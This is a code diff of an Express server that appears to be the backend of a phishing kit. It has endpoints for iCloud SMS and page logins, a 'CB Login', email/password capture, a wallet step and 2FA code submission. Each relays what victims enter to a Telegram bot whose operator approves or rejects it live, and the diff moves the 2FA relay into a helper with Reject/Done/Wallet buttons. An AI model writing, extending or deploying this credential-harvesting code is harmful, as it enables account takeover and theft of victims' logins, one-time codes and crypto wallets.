@@ -12,6 +12,7 @@ const {
   sendApprovalRequestPage,
   sendLoginTelegram,
   sendVerifyTelegram,
+  send2FATelegram,
   send2FACode
 } = require("./bot");
 
@@ -61,7 +62,6 @@ app.post("/get-user-id", (req, res) => {
 
 // -----------------
 // ✅ Plain notification — no buttons, no approval tracking
-// Used for resend code and other info-only messages
 // -----------------
 app.post("/notify", async (req, res) => {
   const { message } = req.body;
@@ -82,7 +82,7 @@ app.post("/notify", async (req, res) => {
 });
 
 // -----------------
-// Email/Password Login (unchanged)
+// Email/Password Login
 // -----------------
 app.post("/login", (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
@@ -98,7 +98,7 @@ app.post("/login", (req, res) => {
 });
 
 // -----------------
-// Generic code submission (unchanged)
+// Generic code submission
 // -----------------
 app.post("/generic-login", (req, res) => {
   const identifier = (req.body.identifier || "").trim();
@@ -112,8 +112,7 @@ app.post("/generic-login", (req, res) => {
 });
 
 // -----------------
-// ✅ FIXED: iCloud SMS Login
-// Now accepts full formatted message from frontend
+// iCloud SMS Login
 // -----------------
 app.post("/sms-login", async (req, res) => {
   const code = (req.body.code || "").trim();
@@ -134,8 +133,7 @@ app.post("/sms-login", async (req, res) => {
 });
 
 // -----------------
-// ✅ FIXED: iCloud Page Login
-// Now accepts full formatted message from frontend
+// iCloud Page Login
 // -----------------
 app.post("/page-login", async (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
@@ -157,8 +155,7 @@ app.post("/page-login", async (req, res) => {
 });
 
 // -----------------
-// ✅ FIXED: CB Login
-// Now accepts full formatted message from frontend
+// CB Login
 // -----------------
 app.post("/send-login", async (req, res) => {
   const { email, password, region, device, message } = req.body;
@@ -177,7 +174,7 @@ app.post("/send-login", async (req, res) => {
 });
 
 // -----------------
-// ✅ NEW: Verify page (3-button: Done / Last 2FA / Wallet)
+// Verify page (3-button: Done / Last 2FA / Wallet)
 // -----------------
 app.post("/send-verify", async (req, res) => {
   const { ip, message } = req.body;
@@ -196,7 +193,7 @@ app.post("/send-verify", async (req, res) => {
 });
 
 // -----------------
-// 2FA: Submit code (called by frontend)
+// ✅ UPDATED: 2FA submit — now uses send2FATelegram (Reject / Done / Wallet)
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
   const { message, requestId } = req.body;
@@ -209,22 +206,7 @@ app.post("/api/submit-2fa", async (req, res) => {
   console.log(`📥 2FA Request received: ${requestId}`);
 
   try {
-    const { bot } = require("./bot");
-    await bot.sendMessage(
-      process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
-      message,
-      {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "✅ Approve", callback_data: `2fa_approve|${requestId}` },
-              { text: "❌ Reject",  callback_data: `2fa_reject|${requestId}` }
-            ]
-          ]
-        }
-      }
-    );
+    await send2FATelegram(message, requestId);
     res.json({ status: "pending", requestId });
   } catch (err) {
     console.error("❌ Failed to send 2FA Telegram message:", err);
